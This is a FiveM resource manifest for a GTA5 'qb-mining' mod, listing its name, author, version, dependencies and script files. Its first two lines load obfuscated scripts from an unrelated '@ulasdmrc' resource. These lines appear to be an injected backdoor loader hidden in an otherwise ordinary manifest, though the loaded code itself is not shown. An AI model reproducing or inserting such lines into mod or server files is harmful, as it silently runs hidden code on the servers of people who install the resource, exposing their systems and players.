shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'

name "qb-mining"
author "Jimathy"
version "v2.3.1"
description "Mining Script By Jimathy"
fx_version "cerulean"
game "gta5"
dependencies { 'qb-menu', 'qb-target', }
shared_scripts { 'config.lua', 'shared/*.lua', 'locales/*.lua' }
client_scripts { 'client.lua' }
server_script { 'server.lua' }
lua54 'yes'